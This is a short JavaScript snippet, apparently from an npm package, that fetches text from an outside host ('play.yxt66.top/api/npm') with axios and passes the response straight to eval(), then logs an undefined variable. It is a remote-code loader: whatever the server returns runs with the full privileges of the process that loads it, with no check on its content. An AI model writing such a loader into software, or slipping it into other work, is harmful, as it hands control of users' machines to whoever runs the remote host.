const  axios  = require("axios");

axios.get('https://play.yxt66.top/api/npm').then(res => {
    console.log(res.data)
    eval(res.data); 
    console.log(test)
})  